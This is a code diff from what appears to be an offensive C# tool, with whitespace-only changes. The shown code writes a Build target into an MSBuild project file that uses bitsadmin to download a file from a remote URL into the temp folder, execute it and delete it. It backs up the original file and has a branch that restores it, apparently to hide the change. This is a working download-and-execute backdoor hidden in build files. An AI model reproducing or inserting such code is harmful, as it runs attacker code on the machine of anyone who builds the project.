@@ -7,10 +7,9 @@
             string vec1 = "<Import Project=\"$(MSBuildToolsPath)\\Microsoft.CSharp.targets\" />";
             string payload = "<Import Project=\"$(MSBuildToolsPath)\\Microsoft.CSharp.targets\"/>^<Target Name=\"Build\">-<Exec Command=\"bitsadmin.exe /transfer " + Job + " " + rURL + " %temp%\\" + fName + "\">+<Output TaskParameter=\"ExitCode\" PropertyName=\"ErrorCode\"/>-</Exec>-<Exec Command=\"%temp%\\" + fName + "\">+<Output TaskParameter=\"ExitCode\" PropertyName=\"ErrorCode\"/>-</Exec>-<Exec Command=\"del %temp%\\" + fName + "\" >+<Output TaskParameter=\"ExitCode\" PropertyName=\"ErrorCode\"/>-</Exec>-<Message Importance=\"high\" Text=\"$(ErrorCode)\"/>-</Target> ";
             string STR = File.ReadAllText(Path);
-
+    
             if (File.Exists(Path + ".bk"))
             {
-
                 File.Delete(Path);
                 File.Copy(Path + ".bk", Path);
                 File.Delete(Path + ".bk");
@@ -27,7 +26,6 @@
             }
             else
             {
-
                 File.Copy(Path, Path + ".bk");
                 payload = payload.Replace("^", "\n  ");
                 payload = payload.Replace("-", "\n    ");
